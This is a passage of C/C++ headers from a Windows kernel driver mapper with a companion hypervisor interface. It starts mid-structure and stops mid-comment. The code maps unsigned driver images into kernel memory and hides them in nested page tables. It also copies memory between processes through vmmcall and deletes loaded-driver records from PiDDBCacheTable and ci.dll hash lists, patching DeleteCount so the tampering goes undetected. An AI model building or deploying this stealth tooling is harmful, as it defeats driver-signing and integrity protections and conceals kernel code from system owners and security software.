    u32 cmdSeq;
    u32 rspSeq;
    u64 stubBase;
    u64 stubSize;
    u64 sharedSysVa;
    u64 offsets[32];
    u32 offsetStatus[32];
} AMG_SHARED_CONTROL_BLOCK;

typedef struct AMG_COMMAND_SLOT
{
    u32 op;
    u32 seq;
    u64 arg0;
    u64 arg1;
    u64 arg2;
    u64 arg3;
    uint8_t payload[64];
} AMG_COMMAND_SLOT;

typedef struct AMG_RESPONSE_SLOT
{
    u32 op;
    u32 seq;
    int32_t status;
    u64 ret;
    uint8_t payload[64];
} AMG_RESPONSE_SLOT;

typedef struct AMG_LOG_RECORD
{
    u32 seq;
    u16 len;
    uint8_t level;
    uint8_t flags;
    u64 timestamp;
    uint8_t payload[640];
} AMG_LOG_RECORD;

typedef struct AMG_LOG_RING
{
    u32 head;
    u32 tail;
    u32 dropped;
    u32 capacity;
    uint8_t record[1];
} AMG_LOG_RING;

typedef struct AMG_SHARED_BLOCK
{
    AMG_SHARED_CONTROL_BLOCK ctrl;
    AMG_COMMAND_SLOT cmd[16];
    AMG_RESPONSE_SLOT rsp[16];
    AMG_LOG_RING log;
} AMG_SHARED_BLOCK;

#endif /* AMG_SHARED_APP_H */

```

### D:\Ameger\Mapper\Mapper\App\Hypervisor.h â€” 271 lines â€” sha12:57826E012218
```c-header
#pragma once

/*
 * Hypervisor
 * https://github.com/SamuelTulach | https://tulach.cc
 */

#include <intrin.h>
#include <Windows.h>
#include <cstring>
#include <iostream>
#include <stdexcept>
#include <stdint.h>

#include "../Utilities/Console.hpp"

namespace Hypervisor
{
    namespace Shared
    {
        constexpr ULONG64 MAGIC = 0xfeed3;
        constexpr ULONG64 COMM_CHECK = 0xdead;

        constexpr ULONG64 MAX_RW_SIZE = 0x10000;

        enum CommandId
        {
            Invalid,
            CheckPresence,
            GetProcess,
            GetDirectoryBase,
            CopyProcessMemory,
            ProtectSelf,
            FlushNpt,
            ProtectRange,
        };

        enum ErrorCodes
        {
            Success,
            ControlBlockReadFail,
            MemoryCopyTooLarge,
            MemoryCopyFailSource,
            MemoryCopyFailTarget,
            InvalidProcess,
        };

        typedef struct _COPY_MEMORY_DATA
        {
            ULONG32 SourceProcessId;
            ULONG32 DestinationProcessId;
            ULONG64 SourceAddress;
            ULONG64 DestinationAddress;
            SIZE_T NumberOfBytes;
        } COPY_MEMORY_DATA;
        static_assert(sizeof(COPY_MEMORY_DATA) == 32, "COPY_MEMORY_DATA ABI mismatch");
    }

    namespace Data
    {
        inline bool Attached = false;
        inline PVOID Shellcode = nullptr;

        inline DWORD CurrentProcessId = 0;
        inline DWORD TargetProcessId = 0;

        inline ULONG64 CurrentEPROCESS = 0;
        inline ULONG64 CurrentDirectoryBase = 0;

        inline ULONG64 TargetEPROCESS = 0;
        inline ULONG64 TargetDirectoryBase = 0;
    }

    inline ULONG64 CallVM(ULONG64 arg1 = 0, ULONG64 arg2 = 0, ULONG64 arg3 = 0, ULONG64 arg4 = 0)
    {
        if (!Data::Shellcode)
        {
            // vmmcall
            // ret
            const BYTE code[] = { 0x0F, 0x01, 0xD9, 0xC3 };

            Data::Shellcode = VirtualAlloc(nullptr, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!Data::Shellcode)
                throw std::runtime_error("Out of memory");

            memcpy(Data::Shellcode, code, sizeof(code));
        }

        typedef ULONG64(__stdcall* CallFunc)(ULONG64 arg1, ULONG64 arg2, ULONG64 arg3, ULONG64 arg4);
        const CallFunc func = reinterpret_cast<CallFunc>(Data::Shellcode);

        ULONG64 output;
        __try
        {
            output = func(arg1, arg2, arg3, arg4);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            printf("[!] SEH handler called\n");
            output = 0xAABB;
        }

        return output;
    }

    inline bool Error(ULONG64 hvOutput)
    {
        if (hvOutput == 0xAABB)
            return true; // HV not loaded

        if (hvOutput == 0xFFFF)
            return true; // command not implemented

        if (hvOutput <= Shared::ErrorCodes::InvalidProcess)
            return true; // documented error code

        return false;
    }

    //
    // Hides an arbitrary guest virtual range [base, base + size) in the NPT.
    // Pass the kernel virtual base the mapper allocated (its DriverObject
    // DriverStart) and the allocation size (DriverSize).  Call it after every
    // driver you want hidden has run DriverEntry, and run FlushAllProcessors()
    // once afterwards.
    //
    inline bool HideMemory(ULONG64 base, SIZE_T size)
    {
        const ULONG64 output = CallVM(Shared::MAGIC, Shared::CommandId::ProtectRange, base, static_cast<ULONG64>(size));
        return output == Shared::ErrorCodes::Success;
    }

    inline bool CheckPresence()
    {
        const ULONG64 output = CallVM(Shared::MAGIC, Shared::CommandId::CheckPresence);
        return output == Shared::COMM_CHECK;
    }

    //
    // Hides the mapped image in the NPT, minus [textBase, textBase + textSize).
    //
    // The driver's own executable code runs in guest mode on the NPF restore
    // path, so blanking the pages it is executing from livelocks that restore.
    // textBase is the resident VA of the executable span and textSize its
    // length; passing 0/0 hides the whole image (the legacy behaviour).
    //
    inline bool Protect(ULONG64 textBase = 0, SIZE_T textSize = 0)
    {
        const ULONG64 output = CallVM(Shared::MAGIC, Shared::CommandId::ProtectSelf, textBase, static_cast<ULONG64>(textSize));
        return output == Shared::ErrorCodes::Success;
    }

    /*
     * Forces every active processor through one #VMEXIT.
     *
     * ProtectSelf() bumps the shared NPT flush generation and sets TlbControl
     * on every published VMCB, but a vCPU that is already inside VMRUN when
     * that store lands never sees it and would only flush at its next exit.
     * Issuing FlushNpt from each CPU pins the current thread to that CPU, so
     * the VMMCALL itself is the exit that arms the flush.
     *
     * Single-threaded on purpose: the shellcode in Data::Shellcode is global
     * state, and a pinned sweep covers every CPU without racing on it.
     */
    inline bool FlushAllProcessors()
    {
        const DWORD processorCount = GetActiveProcessorCount(ALL_PROCESSOR_GROUPS);
        if (processorCount == 0)
            return false;

        const HANDLE thread = GetCurrentThread();

        GROUP_AFFINITY original = { 0 };
        if (!GetThreadGroupAffinity(thread, &original))
            return false;

        bool allFlushed = true;
        for (DWORD index = 0; index < processorCount; index++)
        {
            GROUP_AFFINITY affinity = { 0 };
            affinity.Group = static_cast<WORD>(index / 64);
            affinity.Mask = 1ULL << (index % 64);

            GROUP_AFFINITY previous = { 0 };
            if (!SetThreadGroupAffinity(thread, &affinity, &previous))
            {
                printf("  [*] flush CPU %lu: pin failed\n", index);
                allFlushed = false;
                continue;
            }

            if (CallVM(Shared::MAGIC, Shared::CommandId::FlushNpt) != Shared::ErrorCodes::Success)
            {
                printf("  [*] flush CPU %lu: vmmcall failed\n", index);
                allFlushed = false;
            }
            else
            {
                if (Console::ColorsDisabled())
                    printf("  [+] Flushing CPU %lu: Success\n", index);
                else
                    printf("  \x1b[92m[+]\x1b[0m Flushing CPU \x1b[92m%lu\x1b[0m: \x1b[92mSuccess\x1b[0m\n", index);
            }
        }

        printf("\n");

        SetThreadGroupAffinity(thread, &original, nullptr);

        return allFlushed;
    }

    inline ULONG64 GetEPROCESS(UINT32 processId)
    {
        return CallVM(Shared::MAGIC, Shared::CommandId::GetProcess, processId);
    }

    inline ULONG64 GetDirbase(UINT32 processId)
    {
        return CallVM(Shared::MAGIC, Shared::CommandId::GetDirectoryBase, processId);
    }

    inline bool AttachToProcess(UINT32 processId)
    {
        Data::CurrentProcessId = GetCurrentProcessId();
        Data::TargetProcessId = processId;

        Data::CurrentEPROCESS = GetEPROCESS(Data::CurrentProcessId);
        if (Error(Data::CurrentEPROCESS))
            return false;

        Data::TargetEPROCESS = GetEPROCESS(Data::TargetProcessId);
        if (Error(Data::TargetEPROCESS))
            return false;

        Data::CurrentDirectoryBase = GetDirbase(Data::CurrentProcessId);
        if (Error(Data::CurrentDirectoryBase))
            return false;

        Data::TargetDirectoryBase = GetDirbase(Data::TargetProcessId);
        if (Error(Data::TargetDirectoryBase))
            return false;

        Data::Attached = true;
        return true;
    }

    inline bool CopyProcessMemory(UINT32 sourceProcessId, ULONG64 sourceAddress, UINT32 targetProcessId, ULONG64 targetAddress, SIZE_T bytes)
    {
        //
        // The protocol caps one VMMCALL at Shared::MAX_RW_SIZE (the kernel
        // stages the transfer in a fixed buffer), so larger requests are
        // split here into consecutive calls.  Every chunk is validated
        // end-to-end by the driver like a standalone copy, so a chunk that
        // fails aborts the remainder and reports failure for the request.
        //
        ULONG64 source = sourceAddress;
        ULONG64 target = targetAddress;
        SIZE_T remaining = bytes;

        while (remaining)
        {
            const ULONG64 chunk = (remaining > Shared::MAX_RW_SIZE) ? static_cast<ULONG64>(Shared::MAX_RW_SIZE) : remaining;

            Shared::COPY_MEMORY_DATA data = { 0 };
            data.SourceProcessId = sourceProcessId;
            data.DestinationProcessId = targetProcessId;
            data.SourceAddress = source;
            data.DestinationAddress = target;
            data.NumberOfBytes = chunk;

            const ULONG64 value = CallVM(Shared::MAGIC, Shared::CommandId::CopyProcessMemory, reinterpret_cast<ULONG64>(&data));
            if (value != Shared::ErrorCodes::Success)
                return false;

            source += chunk;
            target += chunk;
            remaining -= static_cast<SIZE_T>(chunk);
        }

        return true;
    }

    inline bool ReadMemory(ULONG64 source, PVOID buffer, SIZE_T size)
    {
        memset(buffer, 0, size);
        return CopyProcessMemory(Data::TargetProcessId, source, Data::CurrentProcessId, reinterpret_cast<ULONG64>(buffer), size);
    }

    inline bool TryReadMemory(ULONG64 source, PVOID buffer, SIZE_T size)
    {
        return CopyProcessMemory(Data::TargetProcessId, source, Data::CurrentProcessId, reinterpret_cast<ULONG64>(buffer), size);
    }

    /*
     * The copy path resolves through physical page tables, so both the
     * source and the destination of every read/write must be RESIDENT
     * (present PTEs at every level).  A non-resident chunk fails the
     * request; the caller sees false rather than a silent partial copy.
     */
    inline bool WriteMemory(ULONG64 buffer, ULONG64 destination, SIZE_T size)
    {
        return CopyProcessMemory(Data::CurrentProcessId, buffer, Data::TargetProcessId, destination, size);
    }

    template<typename T>
    bool TryRead(ULONG64 address, T& value)
    {
        return TryReadMemory(address, &value, sizeof(T));
    }

    template<typename T>
    T Read(ULONG64 address)
    {
        T value = T();
        TryReadMemory(address, &value, sizeof(T));
        return value;
    }

    template<typename T>
    void Write(ULONG64 address, T value)
    {
        WriteMemory(reinterpret_cast<ULONG64>(&value), address, sizeof(T));
    }
}

```

### D:\Ameger\Mapper\Mapper\App\NT.hpp â€” 178 lines â€” sha12:5E2DB74E13D3
```c-header
#pragma once

/*
 * Kernel types.
 *
 * Only the *shapes* of these structures are compiled in. Every address and
 * every field offset used to walk kernel memory comes from the PDB of the
 * running build and is resolved at runtime into Offsets.ini, because these
 * layouts change between Windows releases and there is no supported way to
 * learn them from user mode.
 */

#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

#pragma warning(push)
#pragma warning(disable: 4005) //macro redefinition
#include <ntstatus.h>
#pragma warning(pop)

namespace Nt
{
	//SYSTEM_INFORMATION_CLASS values used here, spelled out because the enum is
	//not part of the documented SDK surface.
	constexpr auto SystemModuleInformation = 11;
	constexpr auto SystemExtendedHandleInformation = 64;

	//Resolved through the export table rather than declared and linked, but
	//ntdll exports them, so a direct declaration is enough.
	extern "C" NTSTATUS NtLoadDriver(PUNICODE_STRING DriverServiceName);
	extern "C" NTSTATUS NtUnloadDriver(PUNICODE_STRING DriverServiceName);
	extern "C" NTSTATUS RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, BOOLEAN* WasEnabled);

	/*
	 * SystemModuleInformation result, used to locate loaded kernel modules.
	 * FullPathName holds the full path and OffsetToFileName is the byte offset
	 * of the base name inside it, so the file name is
	 * FullPathName + OffsetToFileName.
	 */
	typedef struct _RTL_PROCESS_MODULE_INFORMATION
	{
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		//Must be 256: this is the size the kernel uses, and it fixes the array
		//stride at sizeof(_RTL_PROCESS_MODULE_INFORMATION) = 296 on x64. A
		//different value (e.g. 260) pads the struct to 304 and every entry after
		//the first is read misaligned, so module lookups beyond the first module
		//walk into garbage pointers.
		UCHAR FullPathName[256];
	} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

	//Header of the module list returned by SystemModuleInformation, followed by
	//NumberOfModules entries. Declared as a flexible array member.
	typedef struct _RTL_PROCESS_MODULES
	{
		ULONG NumberOfModules;
		RTL_PROCESS_MODULE_INFORMATION Modules[1];
	} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

	/*
	 * SystemExtendedHandleInformation result.
	 *
	 * This is how the mapper reaches the FILE_OBJECT behind its own device
	 * handle: the handle table is the only handle on the system that points at
	 * an object whose location is guaranteed to be the one we opened, so it
	 * removes the need to guess any kernel address to find the device object.
	 */
	typedef struct _SYSTEM_HANDLE
	{
		PVOID Object;
		HANDLE UniqueProcessId;
		HANDLE HandleValue;
		ULONG GrantedAccess;
		USHORT CreatorBackTraceIndex;
		USHORT ObjectTypeIndex;
		ULONG HandleAttributes;
		ULONG Reserved;
	} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

	typedef struct _SYSTEM_HANDLE_INFORMATION_EX
	{
		ULONG_PTR HandleCount;
		ULONG_PTR Reserved;
		SYSTEM_HANDLE Handles[1];
	} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

	//POOL_TYPE as the kernel defines it. Only NonPagedPool is used: the mapped
	//image must be executable and must not be paged out.
	//The _Nx values are separate pool types on modern Windows, not aliases.
	typedef enum class _POOL_TYPE {
		NonPagedPool,
		NonPagedPoolExecute = NonPagedPool,
		PagedPool,
		NonPagedPoolMustSucceed = NonPagedPool + 2,
		DontUseThisType,
		NonPagedPoolCacheAligned = NonPagedPool + 4,
		PagedPoolCacheAligned,
		NonPagedPoolCacheAlignedMustS = NonPagedPool + 6,
		MaxPoolType,
		NonPagedPoolNx = 512,
		NonPagedPoolNxCacheAligned = NonPagedPoolNx + 4,
		NonPagedPoolSessionNx = NonPagedPoolNx + 32,
	} POOL_TYPE;

	/*
	 * ci.dll code integrity hash bucket entry, the list of driver images the
	 * kernel has recorded a hash for.
	 *
	 * This type is NOT a public UDT, so its layout cannot be taken from the
	 * PDB. DriverName lives at the compiled default offset and every use is
	 * confirmed by matching the expected string content first; see
	 * FindUnicodeStringFieldByContent in Driver.cpp.
	 */
	typedef struct _HashBucketEntry
	{
		struct _HashBucketEntry* Next;
		UNICODE_STRING DriverName;
		ULONG CertHash[5];
	} HashBucketEntry, * PHashBucketEntry;

	//Self balancing tree node, the root element of an RTL_AVL_TABLE.
	typedef struct _RTL_BALANCED_LINKS {
		struct _RTL_BALANCED_LINKS* Parent;
		struct _RTL_BALANCED_LINKS* LeftChild;
		struct _RTL_BALANCED_LINKS* RightChild;
		CHAR Balance;
		UCHAR Reserved[3];
	} RTL_BALANCED_LINKS;

	/*
	 * The AVL table behind PiDDBCacheTable.
	 *
	 * DeleteCount is read from the PDB (DriverOffsets::AvlTable_DeleteCount)
	 * and decremented after an entry is deleted, because
	 * RtlDeleteElementGenericTableAvl only updates the count when it can, and
	 * the kernel uses it as a signal that the table was tampered with.
	 */
	typedef struct _RTL_AVL_TABLE {
		RTL_BALANCED_LINKS BalancedRoot;
		PVOID OrderedPointer;
		ULONG WhichOrderedElement;
		ULONG NumberGenericTableElements;
		ULONG DepthOfTree;
		PVOID RestartKey;
		ULONG DeleteCount;
		PVOID CompareRoutine;
		PVOID AllocateRoutine;
		PVOID FreeRoutine;
		PVOID TableContext;
	} RTL_AVL_TABLE;
	typedef RTL_AVL_TABLE* PRTL_AVL_TABLE;

	/*
	 * One entry of PiDDBCacheTable: the record the kernel keeps of a loaded
	 * driver image.
	 *
	 * Used as the lookup key for RtlLookupElementGenericTableAvl, so DriverName
	 * and TimeDateStamp must sit at the offsets the table's own compare routine
	 * reads them from - otherwise the comparison silently fails and the lookup
	 * simply never matches.
	 *
	 * RtlLookupElementGenericTableAvl is resolved by name out of the ntoskrnl
	 * export table, not out of the PDB; see Driver::RtlLookupElementGenericTableAvl.
	 * A build that does not export it makes the lookup report 0, which is a clean
	 * failure the caller turns into "not found in cache" rather than a write
	 * against an unknown entry.
	 *
	 * The layout here is this project's own declaration: _PiDDBCacheEntry is not
	 * a public UDT, so its members cannot be resolved from symbols. The member
	 * offsets are therefore re-derived at run time by content before anything is
	 * written - see Driver::LookupEntry and FindUnicodeStringFieldByContent.
	 */
	typedef struct _PiDDBCacheEntry
	{
		LIST_ENTRY		List;
		UNICODE_STRING	DriverName;
		ULONG			TimeDateStamp;
		NTSTATUS		LoadStatus;
		//Not referenced by name anywhere. Present only so the structure keeps the
		//size the kernel gives this entry, which is what a pointer step over the
		//array depends on. Renaming it would be wrong; reading it would be noise.
		char			_0x0028[16]; // shim engine data, or uninitialized memory for custom drivers
	} PiDDBCacheEntry;
}
```

### D:\Ameger\Mapper\Mapper\Mapper\Mapper.hpp â€” 96 lines â€” sha12:B9FA08D3E167
```c-header
#pragma once

/*
 * The mapping engine.
 *
 * MapDriver takes the mapped image of a user mode driver, fixes it up in a
 * private user mode buffer (relocations, imports, /GS cookie), copies the
 * result into a freshly allocated kernel allocation and calls its entry point.
 *
 * It never writes to kernel memory until every user mode fixup has succeeded,
 * so a malformed or unloadable driver fails before any kernel state exists.
 */

#include <Windows.h>
#include <string>

#include "../PE/PE.hpp"

namespace Mapper
{
	//One import being resolved, handed to an ImportResolver.
	//name is null when the import is by ordinal rather than by name.
	struct ImportLookup {
		ULONG64 module_base;
		const std::string* name;
		uint16_t ordinal;
	};

	//Resolves one import to a kernel address, written to out_address.
	//Returns false when the named function, or the ordinal, is not present in
	//the module the descriptor named. out_address is only written on success.
	typedef bool (*ImportResolver)(const ImportLookup& request, void* context, ULONG64& out_address);
	//Where the kernel side of the image is allocated.
	enum class AllocationMode
	{
		//Single nonpaged pool block holding the whole image. The allocation
		//stays RWX for the lifetime of the mapping: the provider cannot apply
		//per section protection to a pool block.
		AllocatePool,

		//One page aligned, physically contiguous block for the whole image.
		//Same lifetime and protection properties as AllocatePool, but the base
		//is page aligned: a driver that blanks whole pages of its own image
		//(memhv's self-hide) must not touch the pool header in front of the
		//allocation or the block that follows it. This is the default.
		AllocateContiguous,

		//One independent-page allocation per section, so each section can be
		//given its own protection through MmSetPageProtection after the copy.
		//Closer to how the loader maps a driver, but requires that export.
		AllocateIndependentPages
	};

	/*
	 * Map a driver image.
	 *
	 * data         the mapped file image, treated as untrusted input
	 * data_size    length of `data`; every span the PE declares is validated
	 *              against it, so passing a short buffer is safe
	 * free         release the kernel allocation right after the entry point
	 *              returns (only safe for drivers that copy out what they need)
	 * destroyHeader  skip the PE header in the kernel copy and load the image
	 *              from the first section, which hides the "PE" signature at
	 *              the start of the allocation
	 * PassAllocationAddressAsFirstParam  pass the allocation base as the first
	 *              DriverEntry argument; param1 is ignored when set
	 * exitCode     optional, receives the DriverEntry NTSTATUS
	 * residentSize optional, receives the number of bytes resident in the
	 *              kernel allocation (SizeOfImage minus the stripped header
	 *              span), i.e. the exact range the image occupies at the base
	 *              returned - the range a consumer like the hypervisor's NPT
	 *              self-hide must blank, not the file or SizeOfImage
	 *
	 * Returns the kernel base on success and 0 on failure. On failure every
	 * allocation made along the way (the user mode buffer and the kernel one)
	 * is released before returning.
	 */
	//Note: if you set PassAllocationAddressAsFirstParam as true, param1 will be ignored
	ULONG64 MapDriver(BYTE* data, size_t data_size, ULONG64 param1 = 0, ULONG64 param2 = 0, bool free = false, bool destroyHeader = true, AllocationMode mode = AllocationMode::AllocateContiguous, bool PassAllocationAddressAsFirstParam = false, NTSTATUS* exitCode = nullptr, SIZE_T* residentSize = nullptr);

	/*
	 * The three image fixups, exposed rather than kept file-local.
	 *
	 * They are the part of the mapper that decides whether an image is safe to
	 * run, and that is exactly the part worth testing against hand-built
	 * images: none of it touches the kernel, so all of it can be exercised in
	 * user mode.
	 *
	 * RelocateImageByDelta and FixSecurityCookie are pure. ResolveImports takes
	 * the resolver to use rather than calling the kernel helpers itself, so the
	 * same code path can be driven with a stub table instead of a live kernel.
	 * MapDriver supplies the real resolver; see the default in Mapper.cpp.
	 */

	//Applies DIR64 fixups by delta inside [image_base, image_base+image_size).
	//Returns false on an unsupported relocation type or a target outside the
	//image, in both cases having applied nothing further.
	bool RelocateImageByDelta(const PE::vec_relocs& relocs, ULONG64 delta, ULONG64 image_base, ULONG64 image_size);

	//Rewrites /GS security cookie so it matches the base the image runs at.
	//Returns false only when the headers themselves cannot be read; a missing
	//load config, a zero cookie and a cookie outside the image are all "nothing
	//to fix", not failures.
	bool FixSecurityCookie(void* local_image, size_t image_size, ULONG64 kernel_image_base);

	//Fills every IAT slot. Returns false on the first unresolvable import.
	bool ResolveImports(const PE::vec_imports& imports, ImportResolver resolver, void* context);
}
```

### D:\Ameger\Mapper\Mapper\PE\PE.hpp â€” 108 lines â€” sha12:85839C21FDB5
```c-header
#pragma once

/*
 * PE parsing.
 *
 * Every function here reads a PE image out of an untrusted buffer: the file the
 * user passed on the command line. None of the fields it follows (e_lfanew,
 * directory RVAs, SizeOfBlock, section spans, thunk arrays) can be trusted, so
 * each function takes the buffer length and bounds its walk against it.
 *
 * Rule for this file: never dereference a pointer derived from the image
 * without first proving it lies inside [image_base, image_base + image_size).
 * A miss here is not a clean error, it is an out of bounds access in the
 * mapper's own address space.
 */

#include <Windows.h>
#include <string>
#include <vector>

namespace PE
{
	// One IMAGE_BASE_RELOCATION block: where its fixups apply and how many
	// 2-byte entries follow. `address` is the RVA the block applies to, already
	// added to the image base, so it points straight at the patched field.
	struct RelocInfo
	{
		ULONG64 address;
		USHORT* item;
		ULONG32 count;
	};

	//One imported function. `ordinal` is non-zero when the import is by ordinal
	//rather than by name, in which case `name` is empty. Both forms are legal and
	//both have to be resolved: an unresolved IAT slot is 0 and the driver jumps
	//there on its first call to that function.
	struct ImportFunctionInfo
	{
		std::string name;
		ULONG64* address;
		uint16_t ordinal = 0;
	};

	//One imported module and everything it imports.
	struct ImportInfo
	{
		std::string module_name;
		std::vector<ImportFunctionInfo> function_datas;
	};

	using vec_relocs = std::vector<RelocInfo>;
	using vec_imports = std::vector<ImportInfo>;

	//Locate and sanity check the NT headers.
	//image_size is the length of the buffer at image_base.
	//
	//Returns nullptr when the buffer is too small to hold a DOS header, when it
	//is not a PE image, when e_lfanew points outside it, when the NT signature
	//does not match, or when the optional header is not a PE32+ one.
	//
	//The Magic test is here rather than at the call sites because every field
	//this file reads afterwards - ImageBase, Subsystem, every DataDirectory entry
	//and the position of the section table - is a different width or a different
	//offset in a PE32 optional header. Parsing a 32-bit image as PE32+ produces
	//values that are wrong in a way nothing downstream can detect.
	PIMAGE_NT_HEADERS64 GetNtHeaders(void* image_base, size_t image_size);

	//Locate the section table and prove the whole of it lies inside the buffer.
	//
	//IMAGE_FIRST_SECTION is not a fixed offset: it is the end of the optional
	//header, and SizeOfOptionalHeader is a file controlled field, so it is what
	//positions the section table. Every consumer here walks NumberOfSections
	//entries from it, and that count is a file controlled WORD, so without this
	//check a handful of header bytes decide how far out of bounds a loop walks.
	//
	//On success `out_sections` points at the first IMAGE_SECTION_HEADER and
	//`out_count` is the number of entries proven to fit. On failure both are
	//left untouched and false is returned.
	bool GetSectionTable(void* image_base, size_t image_size, PIMAGE_SECTION_HEADER& out_sections, uint16_t& out_count);

	//Collect the base relocation blocks into `relocs`.
	//Returns true with an empty `relocs` when the image has no relocation
	//directory. An image with no relocations can only run at its preferred
	//base, which is never the address the kernel allocates - so the caller has
	//to check what does need fixing.
	//Returns false when the relocation directory is malformed (a directory or
	//block that does not lie inside the image). The caller must refuse to map:
	//applying only part of a relocation set leaves pointers aimed at the
	//preferred base, and the first use of one is a bugcheck.
	bool GetRelocs(void* image_base, size_t image_size, vec_relocs& relocs);

	//Collect the import descriptors and the functions they pull in into
	//`imports`. Both by-name and by-ordinal imports are collected; an ordinal
	//import has an empty name and a non-zero ordinal.
	//Returns true with an empty `imports` when the image has no import
	//directory.
	//Returns false when a descriptor, thunk array or name is malformed. The
	//caller must refuse to map: a descriptor that is skipped leaves its IAT
	//slots holding the file's placeholder values, so the driver's first call
	//through one jumps to a file offset instead of a kernel function.
	bool GetImports(void* image_base, size_t image_size, vec_imports& imports);

	/*
	 * Prove an image carries no absolute address into itself.
	 *
	 * Returns false when the image still holds a 64-bit value pointing inside its
	 * own image. That happens when the file has no relocation directory: the
	 * kernel address an image is loaded at is never its preferred base, and with
	 * no .reloc there is nothing telling the mapper which fields need fixing - so
	 * a surviving pointer is a guaranteed jump to the wrong place.
	 *
	 * Only section data is scanned, never the PE headers: the ImageBase field of
	 * the optional header is itself a value inside the image's own range, and
	 * counting it would flag every well-formed file.
	 *
	 * Called only when GetRelocs returned an empty vector.
	 */
	bool VerifyNoAbsoluteReferences(void* image_base, size_t image_size);
}
```

### D:\Ameger\Mapper\Mapper\Provider\Driver.hpp â€” 421 lines â€” sha12:6BC7A532A0C2
```c-header
#pragma once

#include <Windows.h>
#include <cstdint>
#include <iostream>
#include <string>

#include "../Utilities/Console.hpp"
#include "../App/NT.hpp"
#include "../Symbols/Handler/SymbolsHandler.hpp"

/*
* Structure offsets used while walking kernel objects.
*
* The defaults are values that have been stable across Windows builds, but every
* one of them is replaced at runtime by the offset of the real type in the
* running kernel (the symbol tool writes them into Offsets.ini as
* "[<module>.fields] Struct.Field=<offset>").
*
* Anything that cannot be resolved from symbols is not trusted on its own: the
* caller must structurally validate the object before writing to it.
*
* PDB_OFFSETS is not optional. The build that ships defines it, and the kernel
* walks read SymbolsHandler unconditionally from Driver.cpp, so a configuration
* without it does not fall back to compiled-in offsets - it does not compile.
* The guards that used to suggest otherwise have been removed rather than left
* to mislead the next reader.
*/
struct DriverOffsets {
	uint32_t FileObject_DeviceObject = 0x8;
	uint32_t DeviceObject_DriverObject = 0x8;
	uint32_t DriverObject_DriverSection = 0x28;
	uint32_t LdrEntry_BaseDllName = 0x58;
	uint32_t AvlTable_DeleteCount = 0x40;

	//_PiDDBCacheEntry and HashBucketEntry are not UDTs in the public PDBs, so
	//these stay at their compiled defaults and are additionally derived at
	//runtime by content matching in the callers.
	uint32_t PiDDBCacheEntry_ListBlink = 0x8;
	uint32_t PiDDBCacheEntry_ListFlink = 0x0;
	uint32_t HashBucketEntry_DriverName = 0x8;

	/*
	 * Upper bound on a plausible member offset for any of the types above.
	 *
	 * The largest is _KLDR_DATA_TABLE_ENTRY, which is a few hundred bytes; a
	 * kilobyte is far past anything real and below the first page, so a resolved
	 * value at or above it means the entry in Offsets.ini does not describe the
	 * field that was asked for. Used to reject a bad resolution loudly rather
	 * than quietly keep the compiled default.
	 */
	static constexpr uint64_t kMaxFieldOffset = 0x1000;

	bool ResolvedFromSymbols = false;

	//Count of the public UDT fields above that were replaced with this build's
	//own offset. Reported alongside ResolvedFromSymbols so a partial resolution
	//is visible rather than hidden behind a single boolean.
	uint32_t ResolvedFieldCount = 0;

	//Total number of fields that have a public UDT to resolve against. The
	//internal types further down deliberately have none, so they are not counted.
	static constexpr uint32_t kResolvableFieldCount = 5;

	/*
	 * Offsets inside _DRIVER_OBJECT and _DRIVER_EXTENSION.
	 *
	 * Separate from the block above because these are only needed to build the
	 * DRIVER_OBJECT handed to DriverEntry, and because a miss here is expected
	 * on builds that do not publish one of them - the constructor validates what
	 * it wrote instead of assuming the layout.
	 *
	 * Defaults are the x64 values. _DRIVER_EXTENSION has no Size member in the
	 * PDB type stream, so nothing is written there: the back-pointer below is
	 * the only field the constructor touches, because it is the one
	 * IoCreateDevice dereferences.
	 */
	uint32_t DriverObject_Size = 0x02;
	uint32_t DriverObject_DriverStart = 0x18;
	uint32_t DriverObject_DriverSize = 0x20;
	uint32_t DriverObject_DriverExtension = 0x30;
	uint32_t DriverObject_Flags = 0x10;
	uint32_t DriverObject_DriverUnload = 0x68;
	uint32_t DriverExtension_DriverObject = 0x00;

	//How many of the seven fields above were replaced with this build's own.
	uint32_t DriverObjectResolvedCount = 0;
	static constexpr uint32_t kDriverObjectResolvableFieldCount = 7;

	void LoadFromSymbols() {
		const auto lookup = [](const wchar_t* name, uint32_t& target) {
			const auto value = SymbolsHandler::GetInstance()->GetFieldOffset(name);
			//A field that resolves to something past this bound cannot be a
			//member offset of any of the types involved, so it is treated as a
			//resolution failure rather than silently written over the compiled
			//default. Previously such a value was dropped without a line of log
			//and the run continued on the default, which is the one failure mode
			//this file exists to prevent.
			if (value == SymbolsHandler::kFieldUnresolved || value >= kMaxFieldOffset) {
				if (value != SymbolsHandler::kFieldUnresolved)
					Log(L"[!] Field " << Val(name) << L" resolved to " << Val(Hex(value))
						<< L", outside the plausible offset range; keeping the compiled default" << std::endl);
				return false;
			}
			target = static_cast<uint32_t>(value);
			return true;
		};

		uint32_t resolved = 0;
		resolved += lookup(L"_FILE_OBJECT.DeviceObject", FileObject_DeviceObject) ? 1u : 0u;
		resolved += lookup(L"_DEVICE_OBJECT.DriverObject", DeviceObject_DriverObject) ? 1u : 0u;
		resolved += lookup(L"_DRIVER_OBJECT.DriverSection", DriverObject_DriverSection) ? 1u : 0u;
		resolved += lookup(L"_KLDR_DATA_TABLE_ENTRY.BaseDllName", LdrEntry_BaseDllName) ? 1u : 0u;
		resolved += lookup(L"_RTL_AVL_TABLE.DeleteCount", AvlTable_DeleteCount) ? 1u : 0u;

		ResolvedFieldCount = resolved;
		//All or nothing, matching how every other resolver in this project
		//treats a partial answer. A single resolved field used to set this flag
		//and the caller then reported "offsets resolved from symbols for this
		//build" while four fields were still compiled-in guesses.
		ResolvedFromSymbols = (resolved == kResolvableFieldCount);

		/*
		 * Same treatment for the DRIVER_OBJECT layout. Counted separately from
